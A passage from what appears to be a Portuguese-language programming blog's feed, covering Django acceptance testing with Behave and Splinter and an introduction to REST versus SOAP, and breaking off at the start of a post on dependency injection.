testes de interface &lt;em&gt;web&lt;/em&gt;, como &lt;em&gt;Selenium&lt;/em&gt;, &lt;em&gt;PhantomJS&lt;/em&gt; e &lt;em&gt;zope.testbrowser&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Conseguimos instalá-la de forma muito fácil, através do comando &lt;code&gt;pip&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ pip install splinter
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;É ele que nos permite, através de sua interface, escrever testes utilizando o driver do
&lt;em&gt;Firefox&lt;/em&gt; (por exemplo), e deixar as &lt;em&gt;tasks&lt;/em&gt; executando em nosso servidor de integração
contínua com um driver &lt;em&gt;headless&lt;/em&gt;, como o &lt;em&gt;PhantomJS&lt;/em&gt;.&lt;/p&gt;
&lt;h3&gt;Django + Behave + Splinter == Epic Win&lt;/h3&gt;
&lt;p&gt;Podemos utilizar o &lt;em&gt;Splinter&lt;/em&gt; juntamente com a mecânica de teste do &lt;em&gt;Behave&lt;/em&gt;.
A maneira mais fácil é através do esquema de configuração da suite,
criando o arquivo &lt;code&gt;features/environment.py&lt;/code&gt;, com o seguinte conteúdo:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;splinter&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;Browser&lt;/span&gt;


&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;before_all&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;context&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="n"&gt;context&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;browser&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;Browser&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
    &lt;span class="n"&gt;context&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;server_url&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;http://localhost:8000&amp;#39;&lt;/span&gt;


&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;after_all&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;context&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="n"&gt;context&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;browser&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;quit&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Pronto! O contexto dos nossos testes tem a propriedade &lt;code&gt;browser&lt;/code&gt;, que é a instância do &lt;em&gt;Splinter&lt;/em&gt;
para execução dos testes de interface.&lt;/p&gt;
&lt;p&gt;As &lt;em&gt;specs&lt;/em&gt; executarão com o &lt;em&gt;Firefox&lt;/em&gt;, por padrão. Caso queira alterar o navegador,
basta especificá-lo na instância de &lt;code&gt;Browser&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;context&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;browser&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;Browser&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;chrome&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Dado um determinado cenário&lt;/h2&gt;
&lt;p&gt;Vamos escrever o código &lt;em&gt;Python&lt;/em&gt; necessário para atender a seguinte condição:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;Given&lt;/span&gt; &lt;span class="n"&gt;an&lt;/span&gt; &lt;span class="n"&gt;authenticated&lt;/span&gt; &lt;span class="k"&gt;user&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Para isso, criaremos um &lt;em&gt;step&lt;/em&gt; específico para autenticação:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# features/steps/auth.py&lt;/span&gt;

&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;behave&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;given&lt;/span&gt;
&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;django.contrib.auth.models&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;User&lt;/span&gt;


&lt;span class="nd"&gt;@given&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;an authenticated user&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;given_auth_user&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;context&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="n"&gt;User&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;objects&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;create_superuser&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;username&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;test&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;email&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;foo@bar&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;test&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

    &lt;span class="n"&gt;br&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;context&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;browser&lt;/span&gt;
    &lt;span class="n"&gt;br&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;visit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;context&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;base_url&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;/admin/&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;br&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;fill&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;username&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;test&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;br&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;fill&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;password&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;test&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;br&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;find_by_css&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;.submit-row input&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;first&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;click&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;O código acima é simples e objetivo. Através do &lt;em&gt;decorator&lt;/em&gt; &lt;code&gt;@given&lt;/code&gt; associamos um determinado
pedaço de código &lt;em&gt;Python&lt;/em&gt; a um trecho das histórias escritas em &lt;code&gt;.feature&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Rodando o &lt;code&gt;behave&lt;/code&gt;, teremos uma saída similar a essa:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ python manage.py behave

Creating &lt;span class="nb"&gt;test&lt;/span&gt; database &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="nb"&gt;alias&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;default&amp;#39;&lt;/span&gt;...
Feature: Logged in page &lt;span class="c1"&gt;# features/home-logada.feature:1&lt;/span&gt;

  Scenario: Access index page      &lt;span class="c1"&gt;# features/home-logada.feature:3&lt;/span&gt;
    Given an authenticated user    &lt;span class="c1"&gt;# features/steps/auth.py:5 0.646s&lt;/span&gt;
    When I access the home page    &lt;span class="c1"&gt;# None&lt;/span&gt;
    Then I see my username printed &lt;span class="c1"&gt;# None&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;O motor de testes, além de identificar e executar o trecho de código necessário
para contemplar uma expressão, exibe o tempo de execução da mesma.&lt;/p&gt;
&lt;h2&gt;Quando alguma coisa acontece&lt;/h2&gt;
&lt;p&gt;Vamos para a parte onde o usuário interage com a aplicação.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# features/steps/actions.py&lt;/span&gt;

&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;behave&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;when&lt;/span&gt;


&lt;span class="nd"&gt;@when&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;I access the home page&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;access_the_home_page&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;context&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="n"&gt;br&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;context&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;browser&lt;/span&gt;
    &lt;span class="n"&gt;br&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;visit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;context&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;base_url&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;/&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Aqui começa a ficar mais evidente o funcionamento de &lt;em&gt;steps&lt;/em&gt;. Se amanhã
eu precisar de um novo cenário onde é necessário acessar a página inicial,
eu posso aproveitar o &lt;code&gt;when&lt;/code&gt; criado acima. O &lt;em&gt;Behave&lt;/em&gt; fará isso automaticamente
para você... Portanto, organizar os &lt;em&gt;steps&lt;/em&gt; de uma forma que eles agrupem
um determinado grupo de ações é uma sugestão interessante.&lt;/p&gt;
&lt;h2&gt;Então eu espero algum resultado&lt;/h2&gt;
&lt;p&gt;E para finalizar o nosso exemplo, vamos para o &lt;em&gt;decorator&lt;/em&gt; de &lt;code&gt;@then&lt;/code&gt;,
que é o passo onde validamos o resultado dos acontecimentos disparados por &lt;code&gt;@when&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# features/steps/results.py&lt;/span&gt;

&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;behave&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;then&lt;/span&gt;


&lt;span class="nd"&gt;@then&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;I see my username printed&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;see_my_username&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;context&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="n"&gt;br&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;context&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;browser&lt;/span&gt;
    &lt;span class="n"&gt;body&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;br&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;find_by_css&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;body&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

    &lt;span class="k"&gt;assert&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;Hello test!&amp;#39;&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;body&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;text&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Pronto! Executamos nossas &lt;em&gt;specs&lt;/em&gt; e temos o seguinte resultado:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ python manage.py behave

Creating &lt;span class="nb"&gt;test&lt;/span&gt; database &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="nb"&gt;alias&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;default&amp;#39;&lt;/span&gt;...
Feature: Logged in page &lt;span class="c1"&gt;# features/home-logada.feature:1&lt;/span&gt;

  Scenario: Access index page      &lt;span class="c1"&gt;# features/home-logada.feature:3&lt;/span&gt;
    Given an authenticated user    &lt;span class="c1"&gt;# features/steps/auth.py:5 0.654s&lt;/span&gt;
    When I access the home page    &lt;span class="c1"&gt;# features/steps/actions.py:4 0.888s&lt;/span&gt;
    Then I see my username printed &lt;span class="c1"&gt;# features/steps/results.py:4 0.075s&lt;/span&gt;

&lt;span class="m"&gt;1&lt;/span&gt; feature passed, &lt;span class="m"&gt;0&lt;/span&gt; failed, &lt;span class="m"&gt;0&lt;/span&gt; skipped
&lt;span class="m"&gt;1&lt;/span&gt; scenario passed, &lt;span class="m"&gt;0&lt;/span&gt; failed, &lt;span class="m"&gt;0&lt;/span&gt; skipped
&lt;span class="m"&gt;3&lt;/span&gt; steps passed, &lt;span class="m"&gt;0&lt;/span&gt; failed, &lt;span class="m"&gt;0&lt;/span&gt; skipped, &lt;span class="m"&gt;0&lt;/span&gt; undefined
Took 0m1.617s
Destroying &lt;span class="nb"&gt;test&lt;/span&gt; database &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="nb"&gt;alias&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;default&amp;#39;&lt;/span&gt;...
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Garantimos através dos cenários acima que, dado um usuário logado,
imprimiremos o seu &lt;em&gt;username&lt;/em&gt; na rota &lt;code&gt;http://localhost:8000/&lt;/code&gt;.&lt;/p&gt;
&lt;h2&gt;Considerações finais&lt;/h2&gt;
&lt;p&gt;O &lt;em&gt;Behave&lt;/em&gt; é uma ótima ferramenta de &lt;em&gt;BDD&lt;/em&gt; para &lt;em&gt;Python&lt;/em&gt;. Sua integração
com o &lt;em&gt;Django&lt;/em&gt; e demais &lt;em&gt;frameworks&lt;/em&gt; é relativamente simples, o que só
aumenta a simpatia pela ferramenta.&lt;/p&gt;
&lt;p&gt;Já sofri muito com escrita de testes de aceitação com &lt;em&gt;Django&lt;/em&gt;. Não é
um veredicto, mas até o momento o sentimento é extremamente positivo em relação
ao casamento entre &lt;em&gt;Behave&lt;/em&gt; e &lt;em&gt;Django&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Até a próxima!&lt;/p&gt;
&lt;h2&gt;Referências&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://pythonhosted.org/behave/"&gt;&lt;em&gt;Behave: Behavior-Driven Development, Python style&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/mixxorz/behave-django"&gt;&lt;em&gt;GitHub: behave-django&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://splinter.readthedocs.org/en/latest/"&gt;&lt;em&gt;Splinter: Tool for testing web applications using Python&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</content><category term="desenvolvimento"></category><category term="testes"></category><category term="bdd"></category><category term="aceitação"></category><category term="python"></category><category term="django"></category><category term="behave"></category><category term="splinter"></category></entry><entry><title>REST - Parte 1</title><link href="https://klauslaube.com.br/2016/01/06/rest-parte-1.html" rel="alternate"></link><published>2016-01-06T13:00:00-02:00</published><updated>2016-01-06T13:00:00-02:00</updated><author><name>Klaus Peter Laube</name></author><id>tag:klauslaube.com.br,2016-01-06:/2016/01/06/rest-parte-1.html</id><summary type="html">&lt;p&gt;Em tempos onde os &lt;a href="http://www.infoq.com/br/news/2015/04/microservices-current-state" title="O estado da arte em micro serviços"&gt;microservices&lt;/a&gt; ganham cada vez mais força, e &lt;a href="https://dev.twitter.com/rest/public" title="Conheça a API do Twitter"&gt;aplicações de sucesso&lt;/a&gt; liberam a sua &lt;em&gt;API&lt;/em&gt; para desenvolvedores construírem um ecossistema ao redor delas, não considerar seguir boas práticas na construção de um serviço pode ser uma tomada de decisão arriscada, tanto no quesito do negócio, quanto no …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Em tempos onde os &lt;a href="http://www.infoq.com/br/news/2015/04/microservices-current-state" title="O estado da arte em micro serviços"&gt;microservices&lt;/a&gt; ganham cada vez mais força, e &lt;a href="https://dev.twitter.com/rest/public" title="Conheça a API do Twitter"&gt;aplicações de sucesso&lt;/a&gt; liberam a sua &lt;em&gt;API&lt;/em&gt; para desenvolvedores construírem um ecossistema ao redor delas, não considerar seguir boas práticas na construção de um serviço pode ser uma tomada de decisão arriscada, tanto no quesito do negócio, quanto no quesito técnico.&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;p&gt;A &lt;em&gt;Internet&lt;/em&gt; já passou por muita coisa quando o assunto é &lt;em&gt;API&lt;/em&gt;, desde a total falta de padrões até a criação de protocolos exageradamente complexos. O &lt;em&gt;REST&lt;/em&gt; vem como uma solução elegante que está longe de ser "anárquica", porém mais longe ainda de ser complicada.&lt;/p&gt;
&lt;h2&gt;Serviços web podem ser burocráticos&lt;/h2&gt;
&lt;p&gt;Antes de mais nada é preciso dizer que a "&lt;em&gt;internet&lt;/em&gt; é maior que a &lt;a href="https://klauslaube.com.br/tag/web.html" title="Leia mais sobre web"&gt;&lt;em&gt;web&lt;/em&gt;&lt;/a&gt;". Ou seja, quando digo que você deveria utilizar &lt;em&gt;REST&lt;/em&gt;, estou sendo específico para um determinado tipo de solução na camada &lt;em&gt;HTTP&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Quando falo sobre serviços na &lt;em&gt;web&lt;/em&gt;, automaticamente sou remetido a &lt;em&gt;&lt;a href="https://en.wikipedia.org/wiki/Service-oriented_architecture" title="Leia mais sobre SOA"&gt;SOA&lt;/a&gt;&lt;/em&gt; ou &lt;em&gt;&lt;a href="https://pt.wikipedia.org/wiki/SOAP" title="Leia mais sobre SOAP"&gt;SOAP&lt;/a&gt;&lt;/em&gt;. Até então, nunca consegui pensar nesses dois termos de forma dissociada, mas não é bem assim que as coisas funcionam...&lt;/p&gt;
&lt;p&gt;A Arquitetura Orientada a Serviço (SOA) é um padrão onde aplicações provém serviços para demais componentes através de protocolos de comunicação. Uma arquitetura &lt;em&gt;SOA&lt;/em&gt; vai além de definir uma &lt;em&gt;&lt;a href="https://en.wikipedia.org/wiki/Application_programming_interface" title="Leia mais sobre API"&gt;API&lt;/a&gt;&lt;/em&gt;, ela define a interface em termos de protocolo e funcionalidade, provendo assim uma maior interoperabilidade do seu serviço.&lt;/p&gt;
&lt;p&gt;Mas o que necessariamente significa o termo "serviço"? Segundo o &lt;em&gt;&lt;a href="https://en.wikipedia.org/wiki/The_Open_Group" title="Leia mais sobre o Open Group"&gt;Open Group&lt;/a&gt;&lt;/em&gt;:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Is a logical representation of a repeatable business activity that has a specified outcome (e.g., check customer credit, provide weather data, consolidate drilling reports).
Is self-contained.
May be composed of other services.
Is a "black box" to consumers of the service.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Já o &lt;em&gt;SOAP&lt;/em&gt;, de forma bem resumida, é um protocolo que utiliza a linguagem de marcação &lt;em&gt;XML&lt;/em&gt; e baseia-se nos protocolos de comunicação &lt;em&gt;RPC&lt;/em&gt; e &lt;em&gt;HTTP&lt;/em&gt; para negociação e transmissão de mensagens. Quem já trabalhou com a tecnologia pode até duvidar, mas a sua premissa é simplicidade e independência de linguagem, modelo e transporte.&lt;/p&gt;
&lt;p&gt;Com o passar do tempo os termos acima ficaram estigmatizados por serem "bloated". O excesso de "corporativismo" para construir um serviço e distribuir dados pode terminar em um processo muito bem documentado, porém, é uma "carga" de banda e desenvolvimento que nem sempre estamos dispostos a pagar.&lt;/p&gt;
&lt;p&gt;É aí que entra o &lt;em&gt;REST&lt;/em&gt;.&lt;/p&gt;
&lt;h2&gt;Serviços web podem ser simples&lt;/h2&gt;
&lt;p&gt;O &lt;em&gt;REpresentational State Transfer&lt;/em&gt; (&lt;em&gt;REST&lt;/em&gt;) é um estilo de arquitetura amplamente utilizado no desenvolvimento de serviços &lt;em&gt;web&lt;/em&gt;. Segundo o &lt;em&gt;InfoQ&lt;/em&gt;:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;REST é um conjunto de princípios que definem como Web Standards como HTTP e URIs devem ser usados (o que freqüentemente difere um pouco do que muitas pessoas atualmente fazem). A promessa é que se você aderir a princípios REST enquanto estiver desenhando sua aplicação, você terá um sistema que explora a arquitetura da Web em seu benefício.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Em outras palavras, você não precisa de um programa específico no lado do &lt;em&gt;back-end&lt;/em&gt; e um &lt;em&gt;client&lt;/em&gt; exclusivo no &lt;em&gt;front-end&lt;/em&gt; para consumir serviços &lt;em&gt;REST&lt;/em&gt;... Basta lermos arquivos &lt;em&gt;XML&lt;/em&gt; ou &lt;em&gt;JSON&lt;/em&gt; utilizando os verbos (&lt;em&gt;GET&lt;/em&gt;, &lt;em&gt;POST&lt;/em&gt;, &lt;em&gt;PUT&lt;/em&gt; e &lt;em&gt;DELETE&lt;/em&gt;) do protocolo &lt;em&gt;HTTP&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img class="align-center" src="/images/blog/soap-vs-rest-lawrence.jpg" width="600" height="562" title="Considere o Martin Lawrence como seu dado (stackoverflow.com)" alt="Considere o Martin Lawrence como seu dado (stackoverflow.com)"&gt;&lt;/p&gt;
&lt;p&gt;Na verdade, espera-se que o consumidor e produtor do serviço não possuam qualquer vínculo maior que o "respeito" ao contrato daquela determinada &lt;em&gt;API&lt;/em&gt;, reduzindo consideravelmente o consumo de banda, limitando o número de operações ao número de verbos do protocolo e evitando ambigüidade.&lt;/p&gt;
&lt;p&gt;Na &lt;strong&gt;parte 2&lt;/strong&gt; desse artigo iremos explorar de forma prática a utilização de &lt;em&gt;REST&lt;/em&gt; para a construção de uma &lt;em&gt;API&lt;/em&gt; na &lt;em&gt;web&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Até a próxima...&lt;/p&gt;
&lt;h2&gt;Referências&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.infoq.com/br/articles/rest-introduction"&gt;&lt;em&gt;InfoQ&lt;/em&gt;: Uma rápida introdução ao &lt;em&gt;REST&lt;/em&gt; &lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;em&gt;&lt;a href="https://developer.salesforce.com/page/REST_API"&gt;Salesfoce Developers: REST API&lt;/a&gt;&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;&lt;em&gt;&lt;a href="http://stackoverflow.com/questions/209905/representational-state-transfer-rest-and-simple-object-access-protocol-soap"&gt;Stackoverflow: Representational state transfer (REST) and Simple Object Access Protocol (SOAP)&lt;/a&gt;&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;&lt;em&gt;&lt;a href="http://searchsoa.techtarget.com/definition/REST"&gt;TechTarget: REST (representational state transfer) definition&lt;/a&gt;&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;&lt;em&gt;&lt;a href="http://www.webopedia.com/TERM/A/API.html"&gt;Webopedia: API - application program interface&lt;/a&gt;&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;&lt;em&gt;&lt;a href="https://en.wikipedia.org/wiki/Service-oriented_architecture" title="Leia sobre SOA no Wikipedia"&gt;Wikipedia: Service-oriented Architecture&lt;/a&gt;&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;&lt;em&gt;&lt;a href="https://pt.wikipedia.org/wiki/SOAP"&gt;Wikipedia: SOAP&lt;/a&gt;&lt;/em&gt;&lt;/li&gt;
&lt;/ul&gt;</content><category term="desenvolvimento"></category><category term="rest"></category><category term="microservices"></category><category term="apis"></category></entry><entry><title>Injeção de Dependência</title><link href="https://klauslaube.com.br/2015/10/24/injecao-de-dependencia.html" rel="alternate"></link><published>2015-10-24T16:30:00-02:00</published><updated>2015-10-24T16:30:00-02:00</updated><author><name>Klaus Peter Laube</name></author><id>tag:klauslaube.com.br,2015-10-24:/2015/10/24/injecao-de-dependencia.html</id><summary type="html">&lt;p&gt;Se você já teve contato com &lt;a href="http://laravel.com/" title="PHP framework for web artisans"&gt;&lt;em&gt;Laravel&lt;/em&gt;&lt;/a&gt;
ou &lt;a href="https://angularjs.org/" title="HTML enhanced for web apps"&gt;&lt;em&gt;AngularJS&lt;/em&gt;&lt;/a&gt;, sabe muito bem que
um dos maiores motivos de orgulho desses (e de tantos outros) &lt;em&gt;frameworks&lt;/em&gt;
é a "Injeção de Dependência", ou do inglês, &lt;em&gt;Dependency Injection&lt;/em&gt;.
Imagine-se em uma reunião, o seu &lt;em&gt;Product Owner&lt;/em&gt; pede soluções para problemas
complexos, e você …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Se você já teve contato com &lt;a href="http://laravel.com/" title="PHP framework for web artisans"&gt;&lt;em&gt;Laravel&lt;/em&gt;&lt;/a&gt;
ou &lt;a href="https://angularjs.org/" title="HTML enhanced for web apps"&gt;&lt;em&gt;AngularJS&lt;/em&gt;&lt;/a&gt;, sabe muito bem que
um dos maiores motivos de orgulho desses (e de tantos outros) &lt;em&gt;frameworks&lt;/em&gt;
é a "Injeção de Dependência", ou do inglês, &lt;em&gt;Dependency Injection&lt;/em&gt;.
Imagine-se em uma reunião, o seu &lt;em&gt;Product Owner&lt;/em&gt; pede soluções para problemas
complexos, e você manda logo um "precisamos usar injeções de dependências"...
É aumento salarial na hora!&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;p&gt;Brincadeiras à parte, estou fazendo um curso de
&lt;a href="https://www.udemy.com/learn-angularjs/" title="Aprenda AngularJS"&gt;&lt;em&gt;AngularJS&lt;/em&gt; no &lt;em&gt;Udemy&lt;/em&gt;&lt;/a&gt;,
e toda vez que o professor se depara com uma palavra "pomposa", ele para a
aula para fazer um "big word alert".&lt;/p&gt;
&lt;p&gt;Resolvi copiar essa ideia e mostrar como esse conceito na verdade é relativamente simples.&lt;/p&gt;
&lt;h2&gt;Dependency Injection é um Design Pattern&lt;/h2&gt;
&lt;p&gt;Assim como &lt;a href="https://klauslaube.com.br/2011/05/29/afinal-o-que-sao-closures.html" title="Leia mais sobre Closures"&gt;&lt;em&gt;Closures&lt;/em&gt;&lt;/a&gt;
